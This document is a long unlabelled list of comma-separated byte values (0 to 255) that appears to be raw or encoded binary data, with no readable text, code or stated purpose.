88,116,93,111,151,130,160,141,12,33,66,122,206,210,243,203,196,255,8,38,112,58,155,158,179,219,233,239,42,120,43,8,201,130,179,197,208,234,16,15,15,35,209,247,166,200,245,38,120,80,65,108,136,138,187,195,222,116,89,11,25,36,223,226,166,221,228,38,113,86,114,101,137,135,222,208,201,115,88,3,51,135,182,159,195,220,228,42,44,95,115,82,182,173,194,222,235,22,22,4,57,133,153,157,232,229,170,30,38,70,126,186,246,209,248,17,12,0,59,119,46,143,181,221,191,227,23,11,58,72,117,163,225,141,174,91,17,49,83,106,35,156,176,201,245,51,53,45,127,16,243,205,252,150,189,91,107,108,97,10,204,205,146,235,216,7,35,66,83,51,52,144,208,195,255,48,120,19,22,83,146,183,212,222,175,11,42,91,82,92,110,148,131,163,114,98,94,74,126,96,143,180,152,157,170,0,46,80,122,102,147,134,151,193,242,63,75,81,87,3,252,242,134,161,163,72,119,30,42,156,144,159,157,253,30,33,88,70,91,200,217,244,208,226,20,0,18,66,113,128,149,179,245,134,121,119,9,54,42,210,255,252,132,161,72,124,112,85,166,181,209,183,201,164,84,37,87,119,111,149,159,244,133,241,12,41,70,76,217,132,206,248,221,248,63,91,42,26,246,187,208,247,247,54,5,43,92,108,158,169,210,218,130,69,65,32,77,100,135,132,201,241,20,226,42,72,66,72,193,167,222,240,27,19,53,120,70,173,176,142,191,157,1,25,63,33,105,149,145,136,139,180,73,39,43,86,125,74,143,203,233,161,1,35,47,80,74,158,149,229,204,211,35,68,90,87,125,158,149,178,251,94,90,114,75,89,106,152,160,228,177,250,16,34,84,91,118,182,144,232,240,58,87,48,21,47,33,210,174,205,247,214,65,110,2,101,103,145,240,211,245,80,58,72,87,120,99,145,243,157,191,18,61,82,82,97,145,170,167,133,249,28,125,79,112,107,200,143,163,202,251,22,33,117,49,151,185,189,228,201,231,15,33,86,104,187,253,253,245,132,238,7,38,73,66,147,131,213,214,211,251,2,20,6,99,155,181,219,223,159,116,118,101,69,116,140,141,152,148,136,19,14,46,7,120,158,231,197,227,237,246,56,72,10,34,198,189,198,251,232,27,56,67,126,220,144,165,148,248,238,21,114,88,74,147,148,175,216,204,72,13,35,82,59,98,142,212,218,239,3,49,99,20,34,219,181,220,249,30,41,2,35,118,46,146,190,161,200,17,108,92,101,8,111,158,177,195,239,219,65,104,102,84,125,157,238,202,217,94,50,78,72,85,98,157,249,157,185,239,13,44,94,124,102,134,169,141,255,0,115,78,68,68,43,133,188,218,225,26,35,126,5,68,144,191,224,195,228,27,43,86,102,64,44,199,241,130,238,4,51,69,97,161,213,183,162,206,231,9,95,59,19,243,218,238,245,131,173,81,114,15,122,144,145,235,196,201,243,9,42,115,46,196,245,188,197,251,60,42,35,67,109,142,151,248,215,193,21,48,38,44,9,205,240,155,130,183,173,108,8,1,125,136,156,154,194,244,3,54,80,65,219,220,233,195,248,254,31,40,88,69,182,194,161,200,228,233,4,70,63,109,97,177,146,158,255,224,0,41,86,72,218,229,152,237,27,205,89,39,95,121,158,187,151,134,16,4,12,36,69,3,230,197,184,191,165,66,99,110,74,122,148,172,245,213,5,62,14,89,67,104,143,172,192,249,196,65,40,41,125,104,158,196,161,224,7,60,24,2,9,116,147,153,214,240,12,49,106,99,115,156,190,208,207,131,124,55,95,125,2,62,198,165,206,227,1,56,92,96,64,128,168,163,252,247,11,38,113,118,105,181,251,170,195,227,15,46,44,1,152,148,182,149,152,166,29,60,69,93,136,156,163,245,253,2,26,101,67,107,132,153,187,176,146,127,83,59,64,122,130,169,152,194,247,227,52,116,6,122,158,180,191,206,246,38,116,9,54,136,133,177,176,192,217,21,59,94,77,180,193,160,201,198,234,11,65,60,48,33,187,216,194,221,252,22,26,92,104,171,245,159,252,255,235,28,38,74,95,136,184,135,159,30,238,15,45,8,53,202,171,215,245,240,242,56,30,64,100,164,236,217,193,31,22,53,49,18,44,207,164,192,234,6,1,14,23,63,46,148,174,194,253,31,52,5,74,77,68,218,181,220,245,30,111,106,98,109,142,185,199,195,228,32,122,89,80,66,109,137,192,173,160,86,53,77,76,127,128,178,179,196,209,65,123,81,85,114,135,168,160,242,11,58,6,31,110,127,157,176,148,153,165,13,46,66,124,101,153,162,223,197,86,48,37,77,102,105,255,219,179,147,9,38,104,25,34,145,151,164,200,255,29,21,104,119,91,174,207,169,207,250,26,63,57,24,156,172,138,177,205,168,69,121,88,68,155,130,170,168,225,212,53,15,94,109,69,253,214,168,201,226,30,66,60,22,245,255,148,195,253,228,37,113,14,39,217,140,236,225,185,242,12,59,115,39,207,237,221,238,227,93,116,34,66,121,129,168,209,204,160,26,57,110,109,104,141,163,194,231,8,94,92,102,127,96,163,175,217,227,1,79,57,92,68,109,179,197,189,153,117,103,91,75,16,210,191,211,196,141,98,61,61,85,0,33,196,233,149,133,90,126,100,88,103,147,175,238,193,246,3,38,114,21,58,208,249,228,128,94,84,77,64,71,116,219,246,147,131,164,71,108,2,32,24,216,188,202,253,26,9,49,66,97,106,149,182,203,181,31,48,38,64,113,32,194,230,140,180,94,121,22,6,39,41,206,206,160,246,17,58,70,52,156,152,137,173,203,233,50,42,94,73,144,182,157,170,237,230,9,38,125,55,103,181,248,232,137,172,81,103,16,59,253,216,187,210,186,229,29,32,89,42,159,183,215,170,239,161,76,104,6,12,229,229,154,215,204,23,47,40,66,122,146,226,221,202,248,7,36,23,118,112,138,161,186,128,150,112,4,43,126,14,226,175,199,236,170,78,116,28,44,12,186,160,202,178,182,76,117,96,60,218,250,182,173,175,76,24,52,65,118,34,195,228,171,167,94,11,45,66,127,148,191,236,221,234,4,2,35,65,90,207,246,237,191,95,125,5,49,65,48,156,179,219,208,230,14,24,98,9,56,210,186,220,245,24,27,98,46,74,108,161,246,159,229,20,50,50,77,81,197,131,172,231,179,93,120,21,5,5,40,205,227,140,183,83,91,60,125,115,148,144,238,207,224,31,37,95,119,166,137,134,161,208,240,17,11,14,112,105,218,247,231,136,171,80,102,15,16,251,129,167,230,235,26,15,34,12,52,217,188,186,168,229,229,3,20,81,107,130,185,162,205,225,93,122,106,11,46,211,233,241,182,149,24,51,80,104,34,140,178,198,217,254,20,12,48,116,102,156,184,221,228,169,80,45,27,87,116,142,191,203,216,230,75,50,86,59,217,249,155,149,136,172,86,113,14,20,242,134,169,248,166,176,76,106,32,1,148,184,219,136,163,95,79,112,19,56,206,221,207,183,94,46,50,51,85,106,219,244,157,148,162,73,27,90,90,118,139,191,216,194,7,55,5,56,87,119,177,243,152,181,81,120,101,122,109,151,192,182,207,224,25,51,70,54,105,37,204,238,137,226,0,53,92,112,53,158,143,162,250,167,93,47,95,119,103,147,169,249,195,232,47,103,13,53,62,217,246,230,135,170,79,101,14,19,25,156,183,220,236,94,20,53,89,109,156,138,174,141,226,17,15,52,86,113,165,201,169,222,129,92,121,105,10,45,210,199,218,182,229,1,6,83,105,116,132,243,240,138,232,30,44,38,125,112,152,132,178,200,237,30,32,79,103,223,252,236,236,143,180,74,115,52,23,150,189,210,234,131,249,16,34,72,121,140,148,139,232,202,234,25,59,92,72,207,232,195,135,211,10,61,43,64,98,128,246,167,244,91,90,124,96,44,3,216,243,144,128,139,142,12,80,66,50,130,165,194,174,79,87,45,61,119,115,148,186,198,186,30,60,11,75,61,223,253,227,148,172,91,36,38,17,81,99,131,178,138,243,24,111,110,16,52,240,239,168,201,225,84,57,81,82,50,198,198,176,212,211,6,52,89,94,61,150,176,173,210,169,76,102,13,10,46,209,163,199,196,25,23,58,71,39,112,158,250,159,181,94,99,72,3,35,36,200,196,187,137,89,120,100,11,44,60,149,169,220,255,6,49,94,73,100,134,132,163,207,177,14,60,33,118,110,143,201,160,201,229,10,37,25,30,222,169,158,152,220,246,1,33,29,117,150,180,214,208,130,170,84,111,38,17,212,194,229,150,129,174,70,59,76,120,155,153,216,171,213,18,11,102,69,119,143,187,175,255,183,28,55,93,68,121,215,239,143,237,235,209,3,79,83,124,205,167,202,238,255,26,126,104,3,32,250,220,148,185,79,87,104,51,120,146,187,226,136,176,90,126,92,37,76,96,202,224,137,180,80,77,109,15,25,244,133,165,195,163,83,116,118,27,49,218,197,225,191,95,65,79,71,27,121,154,181,138,139,248,77,111,56,80,116,153,162,215,254,47,0,32,92,74,115,222,173,204,241,14,6,45,12,68,111,133,172,193,191,90,119,103,8,10,47,197,238,153,181,83,115,21,57,223,12,253,165,205,240,13,124,104,53,110,127,161,230,132,170,24,53,76,65,156,139,136,162,238,188,24,121,72,119,145,246,165,212,129,160,81,32,94,92,222,255,207,201,192,165,29,40,64,41,139,186,191,183,243,25,76,109,16,53,203,244,159,154,184,88,122,30,46,1,223,180,195,220,208,175,22,28,9,99,136,184,223,230,235,27,40,40,68,215,155,162,214,235,227,31,79,88,119,153,188,181,135,175,184,83,112,96,1,36,201,159,136,179,174,76,108,14,24,245,142,175,205,246,82,91,119,95,118,144,138,139,188,94,76,17,44,69,120,151,161,162,204,196,66,17,98,65,126,136,239,195,250,91,74,111,34,66,125,155,147,159,179,80,23,33,104,84,109,129,236,210,247,89,118,102,102,9,46,196,237,152,180,82,114,62,21,61,37,207,234,135,183,88,123,96,54,62,41,239,206,199,235,12,111,91,72,117,216,213,183,140,184,9,120,95,123,156,156,149,206,211,250,27,11,78,116,146,187,216,219,129,232,6,39,6,107,204,159,171,182,234,30,25,108,6,122,202,255,190,145,227,24,62,29,77,100,156,164,175,210,232,230,69,87,69,108,132,165,232,138,174,84,124,102,1,222,206,239,146,150,134,120,73,30,113,153,189,176,205,206,246,48,109,23,83,112,137,210,228,215,194,15,39,68,121,180,171,186,214,232,214,21,58,80,73,194,147,159,160,93,14,0,104,92,123,150,189,174,131,166,170,64,105,20,48,206,238,144,180,90,104,102,40,70,123,128,247,206,247,15,5,0,77,126,105,166,229,195,189,30,60,68,101,8,45,195,236,151,179,123,92,92,82,60,45,199,225,213,228,18,35,94,88,77,124,129,133,152,173,74,61,68,90,99,150,139,152,137,184,3,44,83,96,97,150,134,205,250,192,75,41,68,120,126,212,146,197,201,234,23,44,5,105,99,208,168,226,177,37,74,57,65,117,201,209,252,152,156,123,120,28,2,42,254,227,182,192,188,66,68,73,69,104,131,149,162,193,222,23,53,48,79,155,205,162,177,214,228,24,127,27,57,217,209,178,185,215,182,76,110,77,123,112,146,240,161,222,249,5,44,12,124,151,189,167,207,191,175,80,115,50,3,222,202,205,249,247,18,51,53,64,95,154,176,162,209,132,231,48,33,71,108,131,184,201,179,21,225,9,42,78,24,254,220,182,184,30,234,5,52,19,100,138,175,146,188,87,83,105,73,75,101,140,235,139,178,22,54,56,71,126,107,190,188,203,240,4,43,40,112,60,39,195,225,129,163,71,109,94,51,117,159,136,231,151,175,23,43,75,81,118,128,161,245,234,232,21,57,90,66,91,219,192,150,191,170,70,100,4,47,4,129,178,169,232,89,12,62,76,102,116,208,175,216,251,85,49,82,1,41,50,205,192,183,254,10,2,77,81,45,53,198,162,205,224,16,59,42,90,142,137,133,169,221,254,28,16,95,116,151,136,253,227,139,181,122,64,20,123,117,135,175,183,135,229,6,32,95,108,155,168,161,225,178,235,28,62,86,107,214,205,159,201,238,14,5,42,111,56,150,188,175,146,131,237,50,37,83,96,169,238,134,247,251,24,14,43,117,43,145,176,233,245,244,236,45,55,16,245,238,165,216,245,181,79,66,37,64,98,147,175,221,194,27,0,53,70,104,119,175,231,200,245,22,24,48,56,22,106,139,174,128,191,70,25,54,79,125,145,151,179,228,250,10,40,37,65,100,178,243,219,252,230,0,38,76,59,114,137,179,212,248,169,88,99,38,65,100,140,183,174,222,10,13,32,74,89,114,128,148,211,248,27,4,26,76,70,114,131,165,179,151,119,111,17,3,95,97,128,137,133,171,93,123,49,123,146,108,130,186,220,199,82,56,85,120,165,218,244,172,197,253,27,47,89,78,58,102,187,151,205,249,1,37,10,51,212,191,128,147,248,225,1,35,22,96,148,131,180,213,147,118,85,72,4,115,156,170,212,178,198,233,56,102,17,45,203,193,160,212,248,27,72,99,0,48,209,244,153,142,157,143,119,9,50,206,202,188,217,216,227,95,10,49,68,126,192,233,148,176,173,77,111,19,57,33,203,230,169,158,246,5,55,84,58,37,193,159,191,161,164,74,88,49,55,221,212,245,155,165,23,2,55,69,62,155,161,215,232,164,78,72,101,21,54,217,254,148,189,168,68,107,76,10,108,155,253,198,255,60,23,41,62,15,37,206,249,149,179,83,117,25,30,6,48,225,197,229,176,47,56,114,116,117,67,178,139,235,169,80,116,115,53,116,102,142,163,211,250,95,52,76,119,120,172,136,152,236,216,49,14,109,83,83,35,228,226,198,255,71,43,72,110,156,150,196,159,188,172,77,112,21,43,212,222,250,152,146,119,48,33,68,98,209,137,184,210,195,231,50,0,91,106,171,163,191,193,212,93,1,43,63,47,208,243,247,141,182,161,87,54,116,153,193,162,187,202,231,80,5,45,77,97,168,232,147,142,172,102,67,27,49,48,218,245,146,129,163,85,112,16,48,44,139,221,241,243,224,71,34,84,62,129,140,171,203,234,175,2,33,80,98,199,181,208,254,240,225,8,32,90,116,138,243,219,232,230,239,64,96,2,38,230,217,151,177,24,9,15,61,77,106,152,190,156,252,5,53,39,78,11,100,153,166,195,146,118,106,88,23,77,107,134,201,168,237,1,50,97,27,56,40,227,193,152,165,23,53,94,90,102,151,173,226,136,190,94,106,22,24,91,68,151,225,219,231,8,102,91,101,49,178,165,255,182,226,24,33,117,40,50,209,251,217,248,16,41,32,78,97,96,158,140,159,136,252,61,45,91,100,167,210,168,199,216,92,70,97,62,46,207,209,246,166,152,229,47,86,127,220,192,197,237,189,159,70,125,51,80,109,189,164,164,222,169,75,97,2,55,211,203,138,143,144,230,27,55,15,107,106,255,246,250,223,175,1,36,84,84,208,194,239,132,196,239,0,32,83,107,154,191,198,202,131,163,31,37,90,96,152,146,136,249,204,205,127,31,1,37,203,243,157,184,127,137,11,45,69,119,204,178,199,240,5,1,118,90,77,46,201,230,150,157,119,27,32,92,92,119,194,255,132,236,11,58,61,91,121,66,131,173,241,239,27,52,20,19,51,213,249,181,170,184,9,61,57,77,111,41,185,175,194,243,6,43,82,76,48,212,135,206,246,235,13,110,31,10,90,186,153,155,255,12,50,3,10,86,98,137,186,210,218,166,114,38,66,109,96,136,157,151,240,30,54,46,114,100,121,147,176,223,251,13,43,51,20,241,243,128,162,211,155,99,119,84,84,39,241,128,163,205,239,6,41,66,111,155,131,202,211,195,241,16,40,14,55,34,254,209,182,180,179,87,97,9,60,133,136,163,179,135,20,27,50,91,45,205,239,147,178,173,163,14,52,18,63,133,168,212,203,212,249,59,85,8,104,134,179,223,231,179,163,68,103,38,15,194,189,196,184,246,20,30,75,66,121,200,171,218,255,236,30,61,73,65,35,141,160,192,232,1,126,83,51,27,123,199,254,155,253,94,88,120,1,39,140,232,158,138,161,95,31,103,24,55,55,227,199,154,166,31,100,120,9,92,174,164,247,198,204,60,2,28,7,124,154,180,218,249,125,86,36,59,94,108,140,250,134,190,231,60,46,79,73,104,163,163,202,211,19,16,81,93,11,96,142,183,197,255,116,87,50,21,19,240,202,175,219,245,103,80,90,79,99,219,196,239,139,131,100,98,13,114,147,111,143,204,207,248,80,119,1,37,33,208,248,155,248,229,10,44,89,96,153,132,192,173,193,14,52,112,14,32,206,160,184,199,204,171,76,56,87,123,129,181,129,130,193,22,17,29,63,35,201,241,155,149,178,136,110,35,88,109,143,245,145,142,174,122,89,19,0,127,148,161,215,215,226,15,112,27,10,49,192,236,128,167,239,22,49,90,116,107,131,233,192,237,252,36,113,17,61,209,185,212,213,220,171,78,47,81,115,139,186,240,147,231,10,46,100,8,46,214,192,155,184,168,99,102,62,67,103,142,246,209,224,23,46,44,103,87,101,201,249,154,189,136,85,104,99,84,107,138,174,223,240,20,10,80,123,71,100,154,160,220,209,4,53,71,70,121,220,194,234,148,133,97,57,73,65,80,137,195,243,138,236,13,38,76,117,117,64,146,216,203,225,30,38,127,120,118,149,152,153,187,95,69,71,58,59,138,138,190,182,212,85,8,62,68,127,136,130,165,208,190,164,6,51,92,112,146,216,226,149,204,23,44,111,62,103,132,178,184,218,212,163,74,32,70,103,142,187,155,151,238,10,0,84,72,101,135,201,223,185,155,82,53,84,64,11,210,219,207,193,170,82,124,23,30,9,129,166,200,130,171,86,114,16,48,210,246,182,169,201,230,0,117,22,57,222,244,157,136,164,161,65,99,7,7,248,187,212,242,167,167,74,111,5,46,217,245,147,179,85,88,126,102,16,43,226,213,221,242,228,119,127,106,6,36,196,230,138,176,88,66,124,25,9,42,205,242,136,177,92,82,88,28,63,136,143,166,218,250,10,54,85,80,98,148,141,185,218,242,36,48,65,66,106,101,255,156,140,173,80,117,11,19,62,218,248,152,186,94,68,108,22,49,45,221,254,225,134,92,111,93,66,111,97,159,239,209,248,235,0,94,65,85,96,146,171,217,206,13,8,86,116,111,166,206,190,218,176,160,65,100,9,223,200,210,238,140,172,78,114,24,0,42,197,193,241,146,159,119,45,66,4,61,254,205,209,204,224,5,58,91,122,109,165,171,170,207,227,18,56,93,64,209,245,155,226,140,167,68,116,21,56,221,243,156,135,130,160,64,98,6,44,254,211,144,163,139,182,65,58,77,108,143,250,217,225,242,3,125,101,15,42,199,247,152,187,160,85,126,105,5,35,195,229,137,175,87,160,81,53,91,122,137,163,195,244,58,88,57,65,126,218,221,232,192,233,14,27,40,92,74,187,149,191,201,234,70,104,107,17,57,35,254,155,139,172,79,116,105,18,61,217,247,151,185,93,105,70,91,74,100,136,253,179,214,30,22,43,79,105,38,135,187,220,188,187,31,30,92,74,117,183,190,212,200,63,46,73,125,108,37,139,190,146,175,95,64,99,8,222,38,209,237,139,171,77,113,23,63,3,14,142,181,217,224,89,60,75,70,141,185,184,255,140,229,5,50,21,118,108,130,197,167,213,225,84,54,71,46,208,244,249,225,139,166,67,115,20,55,220,216,182,236,131,27,54,46,75,106,158,168,240,150,140,225,4,36,75,79,131,160,195,217,212,18,50,45,104,51,148,179,195,249,255,6,60,32,103,44,144,161,209,239,249,15,122,10,7,101,158,184,134,227,248,22,60,95,53,217,255,231,145,172,73,88,121,28,1,215,234,198,201,224,13,18,106,66,125,118,190,219,216,234,6,49,102,67,121,129,183,218,232,92,6,36,50,14,121,158,165,222,200,10,67,40,32,7,39,201,237,147,187,165,64,55,65,95,117,140,170,216,207,23,56,90,116,82,42,197,244,194,252,27,38,35,75,76,39,216,169,201,227,26,34,83,77,83,103,152,245,213,254,25,41,23,31,222,137,190,196,192,235,31,121,88,112,98,110,136,233,191,168,83,111,13,45,207,248,213,233,159,171,82,122,71,127,154,166,247,175,211,31,42,96,4,42,210,252,246,147,131,142,106,35,70,43,147,167,189,219,177,16,55,42,69,127,197,245,150,152,151,126,48,46,77,33,220,227,213,200,240,63,43,87,78,68,158,188,196,193,184,24,51,81,123,148,254,230,144,171,141,122,113,19,78,153,182,190,197,234,246,3,97,65,96,96,172,202,135,225,255,16,51,58,22,253,216,209,249,30,107,101,123,73,100,159,251,151,147,89,78,56,13,117,64,174,131,237,222,202,30,15,24,97,93,187,140,231,223,54,8,103,116,84,77,170,245,155,173,14,45,36,55,127,96,174,229,196,252,3,111,25,30,67,117,167,172,141,186,18,57,95,83,107,165,163,206,207,235,11,53,19,57,55,110,140,161,234,228,28,59,74,36,97,157,182,220,217,164,65,113,18,31,247,198,233,237,175,85,41,86,66,126,223,145,166,211,214,163,70,107,1,0,248,208,238,142,176,126,87,38,66,98,196,244,244,151,150,127,63,40,71,32,192,226,229,139,179,93,120,63,40,98,135,171,227,140,183,83,113,17,51,215,253,229,143,137,140,123,51,84,122,213,254,233,133,130,162,68,104,14,54,32,251,152,136,136,171,122,75,75,116,147,244,148,182,90,95,71,113,12,41,217,250,157,130,88,160,75,103,5,37,199,193,188,176,250,17,42,58,106,97,135,233,158,239,29,51,55,16,123,108,131,166,219,255,35,57,43,55,69,102,154,163,218,255,74,110,115,27,5,32,253,237,142,177,86,108,21,31,59,217,249,155,191,165,77,119,18,14,20,242,203,190,241,246,1,12,68,94,44,220,188,220,231,238,9,62,80,60,124,139,179,167,251,18,3,88,75,87,118,141,189,210,192,242,4,41,127,108,103,142,161,203,225,26,121,97,11,38,195,210,243,150,187,81,122,101,1,223,255,192,228,138,178,92,119,20,4,37,226,225,172,206,254,6,112,73,126,134,172,133,162,220,165,72,40,25,55,134,185,172,162,137,230,13,46,95,97,140,133,211,178,212,213,11,36,75,107,213,181,218,181,184,94,70,112,11,40,216,249,156,129,182,95,74,102,4,36,198,234,144,146,172,40,28,26,108,75,189,151,245,213,39,59,26,126,79,64,164,154,224,202,36,54,23,13,88,34,198,233,212,244,12,30,54,94,101,209,182,174,226,253,28,37,50,30,39,216,170,222,250,229,76,58,49,78,114,146,193,230,188,165,80,108,105,9,43,207,245,157,135,162,127,111,16,18,55,205,220,204,243,30,51,73,1,4,44,216,238,206,128,248,8,57,111,102,125,154,236,202,231,82,120,96,10,37,33,209,242,149,186,80,121,100,0,222,221,213,206,128,179,89,118,65,76,36,91,130,154,247,240,28,46,97,99,144,191,142,163,193,223,7,59,87,116,135,189,139,171,206,193,14,39,66,125,153,176,167,138,142,169,28,43,13,106,128,129,214,250,227,24,2,61,75,115,215,188,213,222,181,26,12,41,65,98,139,140,221,211,198,20,55,56,122,97,152,169,241,187,171,84,45,90,106,112,169,189,217,170,245,27,62,45,116,33,204,232,134,166,167,75,113,25,3,222,251,235,140,175,84,99,95,82,125,215,254,202,240,234,5,21,103,95,110,148,129,181,242,164,1,3,104,66,104,161,185,213,200,224,126,98,39,17,100,131,179,224,188,90,122,28,31,5,45,215,242,143,191,138,110,104,29,6,49,205,235,139,173,81,119,31,9,41,13,148,191,209,185,79,120,99,63,60,220,254,226,136,176,90,95,63,70,76,96,202,224,137,180,80,110,14,48,212,217,193,235,134,163,83,116,61,17,219,136,129,165,254,87,6,43,66,97,137,132,139,160,209,251,50,39,77,114,129,241,237,146,203,21,63,19,76,107,151,153,171,219,240,17,7,34,121,113,138,167,164,193,254,23,62,41,105,103,145,168,198,222,252,1,28,21,57,223,199,241,140,136,184,89,124,97,55,32,203,231,133,132,166,74,112,50,47,169,159,153,237,200,221,55,21,117,71,184,153,241,200,195,196,58,0,106,68,177,150,138,219,163,166,73,52,84,108,159,183,223,228,174,55,14,2,93,124,133,181,159,166,89,43,62,90,69,44,154,176,205,241,19,66,70,28,5,48,204,234,138,172,80,118,30,103,2,223,207,240,147,184,78,93,79,82,127,219,244,178,202,230,23,53,25,51,83,109,136,207,193,179,1,36,13,101,112,183,141,163,203,227,82,127,95,59,98,150,130,224,190,94,64,100,10,50,59,214,243,227,132,167,76,98,11,28,255,146,180,145,168,91,62,40,69,100,187,135,189,217,255,19,1,24,82,111,140,143,184,213,243,16,56,7,75,107,129,172,170,209,230,61,114,20,56,222,198,240,234,135,183,88,123,96,54,223,202,230,201,174,235,12,39,67,1,161,188,164,203,226,227,2,52,87,120,147,142,196,245,207,225,6,44,71,115,149,159,175,248,207,229,15,47,84,71,204,166,213,202,95,29,2,108,15,52,202,243,158,186,88,87,121,29,3,1,248,240,141,189,94,160,69,27,4,47,203,233,137,129,98,49,50,35,1,222,206,239,146,183,77,118,64,28,58,218,214,205,194,224,29,115,102,91,76,106,128,221,135,190,29,33,69,67,112,223,171,187,193,242,31,59,27,92,99,154,130,203,189,19,58,43,93,16,51,215,188,173,202,242,10,44,67,123,81,204,230,241,231,51,88,40,75,109,123,151,247,218,251,91,70,98,0,32,33,197,235,147,189,88,117,101,6,41,206,233,193,216,247,81,120,26,63,147,128,156,173,202,255,31,25,75,112,185,211,150,167,198,232,7,40,30,83,137,177,169,184,194,176,8,38,26,114,152,189,222,218,191,171,46,108,91,118,156,253,226,151,128,171,71,101,5,39,203,241,153,169,144,7,17,107,19,51,154,191,212,247,247,86,52,93,65,101,152,239,140,188,188,95,68,26,3,46,202,232,136,128,99,29,62,45,84,221,159,171,213,250,3,18,127,93,112,217,251,159,133,173,87,81,110,52,18,43,130,208,199,223,31,46,46,64,127,144,246,172,207,233,24,18,39,75,124,158,164,218,242,21,24,120,34,91,120,153,184,175,195,165,87,96,91,86,107,129,162,201,179,21,0,40,73,78,50,211,246,155,177,90,69,97,21,19,111,128,234,155,239,25,59,45,81,105,97,139,165,247,230,21,55,64,119,168,43,158,186,204,244,6,121,80,125,221,117,151,146,197,202,19,40,82,109,155,163,198,235,207,226,4,0,75,112,151,191,187,222,190,244,31,45,8,56,217,252,234,187,191,170,70,100,46,11,195,225,150,241,180,13,0,43,90,60,131,162,221,195,181,85,119,27,43,4,218,170,197,223,187,87,82,25,14,89,172,148,225,207,195,45,30,10,94,168,191,128,226,218,204,39,31,118,72,167,151,247,234,205,181,91,109,78,109,100,148,216,193,209,66,4,60,67,47,217,255,162,214,6,13,77,122,82,121,159,147,202,196,2,47,15,43,75,117,211,249,232,207,235,0,75,36,92,123,138,228,194,254,25,3,58,100,1,49,210,223,183,176,89,68,96,55,16,155,141,172,145,245,4,38,55,65,84,43,143,175,221,229,79,60,66,112,104,102,136,134,138,249,0,48,29,103,116,104,194,178,207,162,3,56,85,115,144,155,132,230,221,225,10,109,74,123,210,156,166,223,189,241,0,36,7,113,145,218,255,149,190,131,104,106,1,96,157,174,187,169,245,57,74,97,72,125,142,184,153,194,231,6,63,124,68,102,155,139,243,203,255,9,1,89,83,109,128,133,136,213,238,8,56,47,110,219,214,236,202,199,232,31,52,87,118,215,181,220,192,197,248,79,108,28,61,10,232,146,134,235,227,7,38,75,99,129,148,228,137,26,225,7,57,117,120,134,146,213,220,30,21,54,3,23,101,151,187,220,193,241,9,53,5,31,127,142,178,204,253,7,127,85,99,77,101,153,244,213,238,27,12,50,28,60,222,194,194,189,254,27,55,98,44,87,127,148,172,198,176,0,43,88,71,57,115,142,178,192,242,6,54,84,114,52,119,132,198,254,237,21,107,71,114,121,212,150,170,136,255,6,53,86,127,96,208,166,217,242,164,8,32,6,54,54,217,212,185,239,237,29,35,78,84,132,140,182,208,214,89,78,106,88,98,131,151,184,217,195,81,125,92,124,110,135,153,173,235,237,25,38,13,69,102,134,162,228,155,170,2,61,59,124,150,154,235,161,211,235,30,48,24,54,214,248,182,204,128,187,29,37,84,117,139,133,215,202,195,200,10,40,93,126,134,152,188,204,236,252,12,112,91,100,157,171,216,247,237,28,126,40,77,117,158,162,180,146,136,139,33,79,61,46,220,243,159,169,66,76,94,117,41,57,200,224,141,183,74,229,52,4,52,137,132,180,220,248,91,60,15,34,10,113,176,164,209,224,31,99,57,69,111,47,197,255,210,230,7,62,120,16,36,36,130,211,247,236,7,106,18,27,54,249,238,232,133,186,83,115,6,2,59,222,229,133,168,177,93,120,28,9,113,145,226,156,232,226,16,50,64,44,107,131,183,144,225,25,10,37,69,125,42,154,175,195,189,93,110,72,106,114,103,200,231,138,184,22,9,65,108,42,198,195,227,175,132,67,117,115,45,200,221,216,251,137,181,68,110,7,44,197,224,231,164,193,173,66,62,95,104,141,130,150,172,195,235,72,62,71,96,144,181,182,144,236,252,27,96,27,48,131,170,206,223,181,89,96,99,71,121,145,171,157,190,128,165,81,73,3,41,222,252,146,186,161,79,84,113,45,55,221,225,132,191,164,189,56,83,37,211,148,163,221,235,18,64,50,47,64,38,166,168,222,236,3,25,99,70,96,136,198,235,155,225,6,0,49,13,56,62,255,205,240,10,9,105,112,26,53,248,239,239,132,189,81,125,101,0,62,216,224,133,163,179,90,119,112,2,41,147,181,141,180,242,7,51,83,64,42,134,188,222,182,13,10,42,75,66,113,194,160,196,230,94,124,13,109,80,122,129,228,150,170,90,49,64,108,41,36,194,226,174,133,66,116,121,41,201,52,216,251,128,179,90,98,15,37,199,205,228,219,206,174,67,61,92,105,142,131,248,173,196,228,75,61,72,103,147,182,144,147,237,253,28,97,28,51,130,169,172,222,180,88,97,98,65,120,142,187,156,156,191,164,80,78,2,40,222,254,154,152,167,66,85,115,42,58,219,227,142,152,165,66,63,80,38,212,171,160,222,228,240,65,51,80,65,41,165,169,221,239,229,24,98,71,97,137,199,236,154,224,228,7,48,12,55,63,254,217,240,26,11,71,111,25,52,251,236,185,133,183,64,27,61,64,100,153,174,222,240,239,42,17,39,85,97,151,143,145,246,228,2,80,82,42,9,151,169,156,170,84,23,43,40,69,118,138,187,219,254,49,62,87,85,74,106,129,183,250,182,21,63,87,114,75,9,236,203,174,227,3,48,53,23,115,117,139,171,201,165,0,43,64,103,119,134,248,158,134,176,97,69,92,119,153,32,246,159,138,140,105,32,72,111,208,215,193,156,185,169,74,109,56,5,148,142,165,193,181,25,41,52,93,118,156,235,250,155,190,163,121,98,13,41,199,231,232,166,159,30,10,90,60,44,205,240,244,138,179,94,122,24,56,218,212,201,133,197,253,8,41,30,13,111,252,238,144,217,237,13,10,91,115,152,143,182,191,130,173,6,8,95,98,113,169,213,242,8,162,78,43,76,122,130,151,158,221,251,17,10,55,67,44,204,238,146,184,160,169,68,97,17,50,213,250,144,185,164,106,80,20,115,98,191,166,222,248,83,79,10,102,0,33,152,177,213,238,79,125,118,78,125,126,147,180,192,251,17,40,17,19,67,118,137,178,213,217,21,38,81,85,112,104,198,233,142,164,77,120,20,17,49,211,247,157,133,175,74,103,61,21,51,150,245,149,137,247,7,39,100,125,104,147,136,207,184,164,75,56,110,117,123,138,162,218,253,3,120,104,76,115,136,155,134,195,239,237,53,36,65,40,219,197,171,202,199,14,6,80,59,103,141,141,188,197,178,93,121,23,55,217,253,227,234,148,175,76,124,29,0,37,209,201,231,195,168,67,106,92,112,152,135,225,145,143,250,46,36,88,101,116,178,211,239,185,87,1,44,82,96,176,166,178,204,202,24,11,113,16,43,155,160,212,227,190,228,2,35,95,125,212,249,143,184,163,94,124,28,62,34,200,240,154,181,82,161,104,72,69,100,201,236,144,162,90,93,115,21,17,43,219,227,218,180,5,51,55,26,5,33,255,159,129,165,75,115,124,23,52,14,232,188,200,240,10,49,29,84,126,135,185,218,132,165,73,52,82,82,88,140,160,206,136,185,66,48,64,67,76,129,185,223,255,